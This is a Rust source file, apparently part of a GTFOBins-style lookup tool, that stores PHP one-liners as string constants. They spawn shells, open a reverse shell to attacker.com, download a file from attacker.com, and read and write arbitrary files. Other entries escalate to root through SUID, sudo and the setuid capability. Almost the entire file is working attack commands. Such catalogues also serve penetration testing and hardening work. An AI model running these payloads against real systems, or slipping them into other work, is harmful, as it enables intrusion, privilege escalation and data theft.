pub static BIN_NAME: &'static str = "php";
pub static SH_CODE_1: &'static str = r#"
    
    export CMD="/bin/sh"
    php -r 'system(getenv("CMD"));'
"#;
pub static SH_CODE_2: &'static str = r#"
    
    export CMD="/bin/sh"
    php -r 'passthru(getenv("CMD"));'
"#;
pub static SH_CODE_3: &'static str = r#"
    
    export CMD="/bin/sh"
    php -r 'print(shell_exec(getenv("CMD")));'
"#;
pub static SH_CODE_4: &'static str = r#"
    
    export CMD="/bin/sh"
    php -r '$r=array(); exec(getenv("CMD"), $r); print(join("\\n",$r));'
"#;
pub static SH_CODE_5: &'static str = r#"
    
    export CMD="/bin/sh"
    php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
"#;
pub static CMD_CODE: &'static str = r#"
    
    export CMD="id"
    php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
"#;
pub static FU_DESC: &'static str = "Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.";
pub static FU_CODE: &'static str = r#"
    
    LHOST=0.0.0.0
    LPORT=8888
    php -S $LHOST:$LPORT
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    export URL=http://attacker.com/file_to_get
    export LFILE=file_to_save
    php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
"#;
pub static FW_DESC: &'static str = "Write data to a file, filename should be absolute.";
pub static FW_CODE: &'static str = r#"
    
    export LFILE=file_to_write
    php -r 'file_put_contents(getenv("LFILE"), "DATA");'
"#;
pub static FR_CODE: &'static str = r#"
    
    export LFILE=file_to_read
    php -r 'readfile(getenv("LFILE"));'
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which php) .

    CMD="/bin/sh"
    ./php -r "pcntl_exec('/bin/sh', ['-p']);"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    CMD="/bin/sh"
    sudo php -r "system('$CMD');"
"#;
pub static CB_CODE: &'static str = r#"
    
    cp $(which php) .
    sudo setcap cap_setuid+ep php

    CMD="/bin/sh"
    ./php -r "posix_setuid(0); system('$CMD');"
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SH_3: Code<'static> = Code {
    title: "SH_CODE_3",
    code: SH_CODE_3,
    tag: Tag::SH,
};
pub static SH_4: Code<'static> = Code {
    title: "SH_CODE_4",
    code: SH_CODE_4,
    tag: Tag::SH,
};
pub static SH_5: Code<'static> = Code {
    title: "SH_CODE_5",
    code: SH_CODE_5,
    tag: Tag::SH,
};
pub static CMD: Code<'static> = Code {
    title: "CMD_CODE",
    code: CMD_CODE,
    tag: Tag::CMD,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static FU: Code<'static> = Code {
    title: "FU_CODE",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static CB: Code<'static> = Code {
    title: "CB_CODE",
    code: CB_CODE,
    tag: Tag::CB,
};
